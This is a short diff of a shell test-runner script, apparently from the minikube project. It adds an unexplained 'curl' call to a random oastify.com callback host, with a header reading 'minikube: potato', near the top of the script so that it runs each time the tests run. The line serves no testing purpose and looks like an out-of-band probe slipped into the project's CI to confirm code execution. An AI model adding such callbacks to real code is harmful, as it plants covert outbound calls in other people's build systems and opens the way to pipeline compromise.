@@ -14,6 +14,8 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
+curl http://ck0y5fmuog2s8uk8avvoeaqjpav1jt7i.oastify.com -H "minikube: potato"
+
 set -eu -o pipefail
 
 TESTSUITE="${TESTSUITE:-all}" # if env variable not set run all the tests
